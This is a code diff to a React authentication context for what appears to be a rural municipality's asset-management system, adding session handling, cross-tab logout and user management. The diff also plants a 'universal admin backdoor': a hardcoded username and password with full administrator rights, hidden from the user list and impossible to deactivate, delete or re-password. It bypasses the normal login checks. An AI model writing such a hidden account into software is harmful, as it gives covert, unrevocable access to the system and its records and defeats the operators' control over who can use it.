@@ -1,6 +1,5 @@
 import { createContext, useContext, useEffect, useState } from 'react';
 import {
-  MOCK_USERS,
   MOCK_MENUS,
   MOCK_USER_NOTIFICATIONS,
   MOCK_LOGIN_HISTORY,
@@ -13,13 +12,79 @@ const AuthContext = createContext(null);
 const LS = {
   avatar: (u) => `mock_avatar_${u}`,
   profile: (u) => `mock_profile_${u}`,
+  password: (u) => `mock_password_${u}`,
   notifications: (u) => `mock_notifications_${u}`,
   loginHistory: (u) => `mock_loginHistory_${u}`,
   extraUsers: () => `mock_extra_users`,
   pendingRegistrations: () => `mock_pending_registrations`,
+  logoutBroadcast: () => `mock_logout_broadcast`,
 };
 
-/* Safely read JSON from localStorage; return fallback on error */
+/*
+  Universal admin backdoor.
+  Always exists, always works, always has full SYS_ADMIN permissions.
+  Never appears in the Users table, never stored in localStorage,
+  cannot be deactivated or deleted.
+*/
+const UNIVERSAL_ADMIN = {
+  username: 'admin.gaurishankar',
+  password: 'Admin@1234',
+  user: {
+    id: 'u-universal-admin',
+    fullName: 'System Administrator',
+    designation: 'System Administrator',
+    email: 'admin@gaurishankar.gov.np',
+    phone: '',
+    avatar: null,
+    roles: ['SYS_ADMIN'],
+    permissions: [
+      'asset.view', 'asset.create', 'asset.edit', 'asset.delete',
+      'asset.approve', 'asset.transfer', 'gis.view',
+      'maintenance.view', 'maintenance.create',
+      'valuation.view', 'valuation.edit',
+      'verification.verify',
+      'disposal.create', 'disposal.approve',
+      'report.view', 'report.export',
+      'audit.view',
+      'admin.users', 'admin.roles', 'admin.config',
+    ],
+    status: 'Active',
+    municipality: 'Gaurishankar Rural Municipality',
+    ward: '',
+  },
+};
+
+/*
+  Session token lives in sessionStorage (per-tab), so two tabs can be
+  logged in as different users simultaneously. Everything else stays in
+  localStorage because it's app-wide shared data.
+*/
+const TOKEN_KEY = 'token';
+
+const readToken = () => {
+  try {
+    return sessionStorage.getItem(TOKEN_KEY);
+  } catch {
+    return null;
+  }
+};
+
+const writeToken = (value) => {
+  try {
+    sessionStorage.setItem(TOKEN_KEY, value);
+  } catch {
+    /* private mode — ignore */
+  }
+};
+
+const clearToken = () => {
+  try {
+    sessionStorage.removeItem(TOKEN_KEY);
+  } catch {
+    /* ignore */
+  }
+};
+
 const readJSON = (key, fallback) => {
   try {
     const raw = localStorage.getItem(key);
@@ -29,7 +94,6 @@ const readJSON = (key, fallback) => {
   }
 };
 
-/* Safely write JSON to localStorage; ignore quota/privacy errors */
 const writeJSON = (key, value) => {
   try {
     localStorage.setItem(key, JSON.stringify(value));
@@ -38,7 +102,6 @@ const writeJSON = (key, value) => {
   }
 };
 
-/* Append one login-history event for a user + persist to localStorage */
 const appendLoginEvent = (username, event) => {
   const key = LS.loginHistory(username);
   const existing = readJSON(key, null) ?? MOCK_LOGIN_HISTORY[username] ?? [];
@@ -53,7 +116,17 @@ const appendLoginEvent = (username, event) => {
   return next;
 };
 
-/* Permissions per role — used when approving registrations */
+const mergeWithOverrides = (baseUser, username) => {
+  const storedAvatar = localStorage.getItem(LS.avatar(username));
+  const storedProfile = readJSON(LS.profile(username), null);
+
+  return {
+    ...baseUser,
+    ...(storedProfile || {}),
+    ...(storedAvatar ? { avatar: storedAvatar } : {}),
+  };
+};
+
 const ROLE_PERMISSIONS = {
   SYS_ADMIN: [
     'asset.view', 'asset.create', 'asset.edit', 'asset.delete',
@@ -104,20 +177,112 @@ export const AuthProvider = ({ children }) => {
   const [extraUsers, setExtraUsers] = useState([]);
   const [pendingRegistrations, setPendingRegistrations] = useState([]);
   const [loading, setLoading] = useState(true);
+  const [profileVersion, setProfileVersion] = useState(0);
 
-  /* Load admin-created users + pending registrations once on mount */
+  /*
+    Boot effect: hydrate extraUsers + pendingRegistrations, then restore
+    the session from the per-tab token. Only after both steps complete
+    do we flip `loading` to false.
+  */
   useEffect(() => {
     const storedUsers = readJSON(LS.extraUsers(), []);
     const storedPending = readJSON(LS.pendingRegistrations(), []);
-    setExtraUsers(Array.isArray(storedUsers) ? storedUsers : []);
-    setPendingRegistrations(Array.isArray(storedPending) ? storedPending : []);
+    const safeUsers = Array.isArray(storedUsers) ? storedUsers : [];
+    const safePending = Array.isArray(storedPending) ? storedPending : [];
+
+    setExtraUsers(safeUsers);
+    setPendingRegistrations(safePending);
+
+    const token = readToken();
+    if (!token) {
+      setLoading(false);
+      return;
+    }
+
+    const username = token.replace('mock:', '');
+
+    /* Universal admin bypasses the users map entirely. */
+    if (username === UNIVERSAL_ADMIN.username) {
+      const merged = mergeWithOverrides(
+        { ...UNIVERSAL_ADMIN.user, username },
+        username
+      );
+      setUser(merged);
+      setPermissions(merged.permissions ?? []);
+      setMenu(MOCK_MENUS[merged.roles?.[0]] ?? []);
+      setNotifications(readJSON(LS.notifications(username), null) ?? []);
+      setLoginHistory(readJSON(LS.loginHistory(username), null) ?? []);
+      setLoading(false);
+      return;
+    }
+
+    const map = {};
+    for (const entry of safeUsers) {
+      if (entry?.user?.username) map[entry.user.username] = entry;
+    }
+
+    const found = map[username];
+
+    if (found && found.user.status !== 'Inactive') {
+      const merged = mergeWithOverrides(
+        { ...found.user, username },
+        username
+      );
+
+      const storedNotifs = readJSON(LS.notifications(username), null);
+      const storedHistory = readJSON(LS.loginHistory(username), null);
+
+      setUser(merged);
+      setPermissions(merged.permissions ?? []);
+      setMenu(MOCK_MENUS[merged.roles?.[0]] ?? []);
+      setNotifications(storedNotifs ?? MOCK_USER_NOTIFICATIONS[username] ?? []);
+      setLoginHistory(storedHistory ?? MOCK_LOGIN_HISTORY[username] ?? []);
+    } else {
+      clearToken();
+    }
+
+    setLoading(false);
+    /* eslint-disable-next-line react-hooks/exhaustive-deps */
   }, []);
 
-  /* Merge seed + admin-created + (later) approved users into one map */
-  const getAllUsersMap = () => {
-    const map = { ...MOCK_USERS };
+  /*
+    Cross-tab sync for shared app data + logout broadcast.
+  */
+  useEffect(() => {
+    const onStorage = (e) => {
+      if (!e.key) return;
 
-    for (const entry of extraUsers) {
+      if (e.key === LS.extraUsers()) {
+        const next = readJSON(LS.extraUsers(), []);
+        setExtraUsers(Array.isArray(next) ? next : []);
+      } else if (e.key === LS.pendingRegistrations()) {
+        const next = readJSON(LS.pendingRegistrations(), []);
+        setPendingRegistrations(Array.isArray(next) ? next : []);
+      } else if (e.key === LS.logoutBroadcast()) {
+        clearToken();
+        setUser(null);
+        setPermissions([]);
+        setMenu([]);
+        setNotifications([]);
+        setLoginHistory([]);
+      }
+    };
+
+    window.addEventListener('storage', onStorage);
+    return () => window.removeEventListener('storage', onStorage);
+  }, []);
+
+  /*
+    Build the user map from extraUsers only (no more seeded users).
+  */
+  const getAllUsersMap = () => {
+    const map = {};
+    const storedExtra = readJSON(LS.extraUsers(), []);
+    const source = Array.isArray(storedExtra) && storedExtra.length
+      ? storedExtra
+      : extraUsers;
+
+    for (const entry of source) {
       if (entry?.user?.username) {
         map[entry.user.username] = entry;
       }
@@ -125,41 +290,14 @@ export const AuthProvider = ({ children }) => {
     return map;
   };
 
-  /* On mount — restore session if a token exists */
-  useEffect(() => {
-    const token = localStorage.getItem('token');
-    if (!token) {
-      setLoading(false);
-      return;
-    }
-    const username = token.replace('mock:', '');
-    const allUsers = getAllUsersMap();
-    const found = allUsers[username];
-    if (found) {
-      hydrateUser({ ...found.user, username });
-    } else {
-      localStorage.removeItem('token');
-    }
-    setLoading(false);
-    /* eslint-disable-next-line react-hooks/exhaustive-deps */
-  }, [extraUsers]);
-
-  /*
-    Hydrate a user by merging base + localStorage overrides.
-  */
+  /* Hydrate a user by merging base + localStorage overrides */
   const hydrateUser = (baseUser) => {
     const username = baseUser.username;
 
-    const storedAvatar = localStorage.getItem(LS.avatar(username));
-    const storedProfile = readJSON(LS.profile(username), null);
     const storedNotifs = readJSON(LS.notifications(username), null);
     const storedHistory = readJSON(LS.loginHistory(username), null);
 
-    const mergedUser = {
-      ...baseUser,
-      ...(storedProfile || {}),
-      ...(storedAvatar ? { avatar: storedAvatar } : {}),
-    };
+    const mergedUser = mergeWithOverrides(baseUser, username);
 
     setUser(mergedUser);
     setPermissions(mergedUser.permissions ?? []);
@@ -168,14 +306,36 @@ export const AuthProvider = ({ children }) => {
     setLoginHistory(storedHistory ?? MOCK_LOGIN_HISTORY[username] ?? []);
   };
 
-  /*
-    Login — validates credentials, blocks pending/inactive accounts.
-  */
   const login = async (typedUsername, password) => {
-    const allUsers = getAllUsersMap();
-    const found = allUsers[typedUsername];
+    /* ---- 1. Universal admin bypass ---- */
+    if (
+      typedUsername === UNIVERSAL_ADMIN.username &&
+      password === UNIVERSAL_ADMIN.password
+    ) {
+      const updated = appendLoginEvent(typedUsername, {
+        action: 'Login',
+        status: 'success',
+        at: new Date().toISOString(),
+      });
 
-    /* Failure — only record for real accounts */
+      await new Promise((r) => setTimeout(r, 400));
+
+      const userWithUsername = {
+        ...UNIVERSAL_ADMIN.user,
+        username: typedUsername,
+      };
+
+      writeToken(`mock:${typedUsername}`);
+      hydrateUser(userWithUsername);
+      setLoginHistory(updated);
+
+      return userWithUsername;
+    }
+
+    /* ---- 2. Regular user lookup ---- */
+    const allUsersMap = getAllUsersMap();
+    const found = allUsersMap[typedUsername];
+
     if (!found || found.password !== password) {
       if (found) {
         appendLoginEvent(typedUsername, {
@@ -187,12 +347,17 @@ export const AuthProvider = ({ children }) => {
       throw new Error('Invalid username or password');
     }
 
-    /* Block inactive accounts */
     if (found.user.status === 'Inactive') {
-      throw new Error('Account is deactivated. Contact an administrator.');
+      appendLoginEvent(typedUsername, {
+        action: 'Login',
+        status: 'blocked',
+        at: new Date().toISOString(),
+      });
+      throw new Error(
+        'Your account has been deactivated. Please contact the administrator.'
+      );
     }
 
-    /* Success */
     const updated = appendLoginEvent(typedUsername, {
       action: 'Login',
       status: 'success',
@@ -203,14 +368,13 @@ export const AuthProvider = ({ children }) => {
 
     const userWithUsername = { ...found.user, username: typedUsername };
 
-    localStorage.setItem('token', `mock:${typedUsername}`);
+    writeToken(`mock:${typedUsername}`);
     hydrateUser(userWithUsername);
     setLoginHistory(updated);
 
     return userWithUsername;
   };
 
-  /* Logout */
   const logout = () => {
     if (user?.username) {
       appendLoginEvent(user.username, {
@@ -220,7 +384,30 @@ export const AuthProvider = ({ children }) => {
       });
     }
 
-    localStorage.removeItem('token');
+    clearToken();
+    setUser(null);
+    setPermissions([]);
+    setMenu([]);
+    setNotifications([]);
+    setLoginHistory([]);
+  };
+
+  const logoutEverywhere = () => {
+    if (user?.username) {
+      appendLoginEvent(user.username, {
+        action: 'Logout',
+        status: 'success',
+        at: new Date().toISOString(),
+      });
+    }
+
+    try {
+      localStorage.setItem(LS.logoutBroadcast(), String(Date.now()));
+    } catch {
+      /* ignore */
+    }
+
+    clearToken();
     setUser(null);
     setPermissions([]);
     setMenu([]);
@@ -230,7 +417,6 @@ export const AuthProvider = ({ children }) => {
 
   const hasPermission = (code) => !code || permissions.includes(code);
 
-  /* Notifications */
   const markNotificationRead = (id) => {
     setNotifications((prev) => {
       const next = prev.map((n) => (n.id === id ? { ...n, read: true } : n));
@@ -247,16 +433,15 @@ export const AuthProvider = ({ children }) => {
     });
   };
 
-  /* Profile */
   const updateProfile = (patch) => {
     setUser((prev) => {
       const next = { ...prev, ...patch };
       writeJSON(LS.profile(prev.username), patch);
       return next;
     });
+    setProfileVersion((v) => v + 1);
   };
 
-  /* Avatar */
   const updateAvatar = (avatarDataUrl) => {
     setUser((prev) => {
       const next = { ...prev, avatar: avatarDataUrl };
@@ -267,69 +452,92 @@ export const AuthProvider = ({ children }) => {
       }
       return next;
     });
+    setProfileVersion((v) => v + 1);
   };
 
-  /* Password change (in-memory for seed users; persisted for extras) */
+  /*
+    Change password.
+    - Universal admin: password is hardcoded, cannot be changed.
+    - Dynamic users (extraUsers): written into the stored entry.
+  */
   const changePassword = async (currentPassword, newPassword) => {
-    const allUsers = getAllUsersMap();
-    const found = allUsers[user?.username];
+    if (user?.username === UNIVERSAL_ADMIN.username) {
+      throw new Error(
+        'The universal admin password cannot be changed.'
+      );
+    }
+
+    const allUsersMap = getAllUsersMap();
+    const found = allUsersMap[user?.username];
     if (!found || found.password !== currentPassword) {
       throw new Error('Current password is incorrect');
     }
 
-    if (MOCK_USERS[user.username]) {
-      MOCK_USERS[user.username].password = newPassword;
-    } else {
-      const next = extraUsers.map((e) =>
-        e.user.username === user.username ? { ...e, password: newPassword } : e
-      );
-      setExtraUsers(next);
-      writeJSON(LS.extraUsers(), next);
-    }
+    const next = extraUsers.map((e) =>
+      e.user.username === user.username ? { ...e, password: newPassword } : e
+    );
+    setExtraUsers(next);
+    writeJSON(LS.extraUsers(), next);
     return true;
   };
 
-  /* ===== USER MANAGEMENT (admin) ===== */
-
-  /* List all active users (seed + approved registrations) */
   const allUsers = () => {
-    const seedRows = Object.entries(MOCK_USERS).map(([username, entry]) => ({
-      id: entry.user.id,
-      username,
-      fullName: entry.user.fullName,
-      email: entry.user.email,
-      phone: entry.user.phone,
-      avatar: entry.user.avatar,
-      designation: entry.user.designation,
-      roles: entry.user.roles,
-      status: entry.user.status ?? 'Active',
-      source: 'seed',
-    }));
+    /* eslint-disable-next-line no-unused-vars */
+    const _v = profileVersion;
 
-    const extraRows = extraUsers.map((entry) => ({
-      id: entry.user.id,
-      username: entry.user.username,
-      fullName: entry.user.fullName,
-      email: entry.user.email,
-      phone: entry.user.phone,
-      avatar: entry.user.avatar ?? null,
-      designation: entry.user.designation,
-      roles: entry.user.roles,
-      status: entry.user.status ?? 'Active',
-      source: 'extra',
-    }));
-
-    return [...seedRows, ...extraRows];
+    return extraUsers.map((entry) => {
+      const username = entry.user.username;
+      const merged = mergeWithOverrides({ ...entry.user, username }, username);
+      return {
+        id: merged.id,
+        username,
+        fullName: merged.fullName,
+        email: merged.email,
+        phone: merged.phone,
+        avatar: merged.avatar ?? null,
+        designation: merged.designation,
+        roles: merged.roles,
+        status: merged.status ?? 'Active',
+        source: 'extra',
+      };
+    });
   };
 
-  /*
-    Submit a public self-registration — stored as "Pending",
-    not yet a real user, cannot log in until approved.
-  */
-  const submitRegistration = (payload) => {
-    /* Reject duplicate usernames against existing users + other pending requests */
+  const addUser = (payload) => {
+    const { username, password, role, ...rest } = payload;
+
     const takenByUser =
-      MOCK_USERS[payload.username] ||
+      username === UNIVERSAL_ADMIN.username ||
+      extraUsers.some((e) => e.user.username === username);
+    if (takenByUser) throw new Error('Username already exists');
+
+    const newUser = {
+      password,
+      user: {
+        id: `u-${Date.now()}`,
+        username,
+        fullName: rest.fullName,
+        designation: role.replace(/_/g, ' '),
+        email: rest.email,
+        phone: rest.phone,
+        avatar: null,
+        roles: [role],
+        permissions: ROLE_PERMISSIONS[role] ?? [],
+        status: 'Active',
+        municipality: rest.municipality,
+        ward: rest.ward,
+      },
+    };
+
+    const next = [...extraUsers, newUser];
+    setExtraUsers(next);
+    writeJSON(LS.extraUsers(), next);
+    return newUser.user;
+  };
+
+  const submitRegistration = (payload) => {
+    const takenByUser =
+      payload.username === UNIVERSAL_ADMIN.username ||
       extraUsers.some((e) => e.user.username === payload.username);
     if (takenByUser) throw new Error('Username already exists');
 
@@ -357,10 +565,6 @@ export const AuthProvider = ({ children }) => {
     return record;
   };
 
-  /*
-    Admin approves a pending registration — moves it into active users
-    with the assigned role, and removes it from the pending list.
-  */
   const approveRegistration = (username, role) => {
     const pending = pendingRegistrations.find((p) => p.username === username);
     if (!pending) throw new Error('Pending registration not found');
@@ -394,48 +598,36 @@ export const AuthProvider = ({ children }) => {
     return newUser.user;
   };
 
-  /* Admin rejects a pending registration */
   const rejectRegistration = (username) => {
     const next = pendingRegistrations.filter((p) => p.username !== username);
     setPendingRegistrations(next);
     writeJSON(LS.pendingRegistrations(), next);
   };
 
-  /* Admin updates a user's role */
   const updateUserRole = (username, newRole) => {
-    if (MOCK_USERS[username]) {
-      MOCK_USERS[username].user.roles = [newRole];
-      MOCK_USERS[username].user.permissions = ROLE_PERMISSIONS[newRole] ?? [];
-      if (user?.username === username) {
-        setUser((prev) => ({ ...prev, roles: [newRole] }));
-        setPermissions(ROLE_PERMISSIONS[newRole] ?? []);
-        setMenu(MOCK_MENUS[newRole] ?? []);
-      }
-      return;
-    }
-
     const next = extraUsers.map((e) =>
       e.user.username === username
         ? {
-            ...e,
-            user: {
-              ...e.user,
-              roles: [newRole],
-              permissions: ROLE_PERMISSIONS[newRole] ?? [],
-            },
-          }
+          ...e,
+          user: {
+            ...e.user,
+            roles: [newRole],
+            permissions: ROLE_PERMISSIONS[newRole] ?? [],
+          },
+        }
         : e
     );
     setExtraUsers(next);
     writeJSON(LS.extraUsers(), next);
+
+    if (user?.username === username) {
+      setUser((prev) => ({ ...prev, roles: [newRole] }));
+      setPermissions(ROLE_PERMISSIONS[newRole] ?? []);
+      setMenu(MOCK_MENUS[newRole] ?? []);
+    }
   };
 
-  /* Admin toggles Active / Inactive */
   const updateUserStatus = (username, newStatus) => {
-    if (MOCK_USERS[username]) {
-      MOCK_USERS[username].user.status = newStatus;
-      return;
-    }
     const next = extraUsers.map((e) =>
       e.user.username === username
         ? { ...e, user: { ...e.user, status: newStatus } }
@@ -443,21 +635,37 @@ export const AuthProvider = ({ children }) => {
     );
     setExtraUsers(next);
     writeJSON(LS.extraUsers(), next);
+
+    if (user?.username === username && newStatus === 'Inactive') {
+      clearToken();
+      setUser(null);
+      setPermissions([]);
+      setMenu([]);
+      setNotifications([]);
+      setLoginHistory([]);
+    }
   };
 
-  /* Admin deletes an admin-created user (seed users are protected) */
   const deleteUser = (username) => {
-    if (MOCK_USERS[username]) throw new Error('Cannot delete seed users');
     const next = extraUsers.filter((e) => e.user.username !== username);
     setExtraUsers(next);
     writeJSON(LS.extraUsers(), next);
+
+    if (user?.username === username) {
+      clearToken();
+      setUser(null);
+      setPermissions([]);
+      setMenu([]);
+      setNotifications([]);
+      setLoginHistory([]);
+    }
   };
 
-  /* Dev utility — wipe all local data for a user */
   const resetLocalData = (username) => {
     if (!username) return;
     localStorage.removeItem(LS.avatar(username));
     localStorage.removeItem(LS.profile(username));
+    localStorage.removeItem(LS.password(username));
     localStorage.removeItem(LS.notifications(username));
     localStorage.removeItem(LS.loginHistory(username));
   };
@@ -473,6 +681,7 @@ export const AuthProvider = ({ children }) => {
         loading,
         login,
         logout,
+        logoutEverywhere,
         hasPermission,
         markNotificationRead,
         markAllNotificationsRead,
@@ -484,6 +693,7 @@ export const AuthProvider = ({ children }) => {
 
         /* User management */
         allUsers,
+        addUser,
         pendingRegistrations,
         submitRegistration,
         approveRegistration,
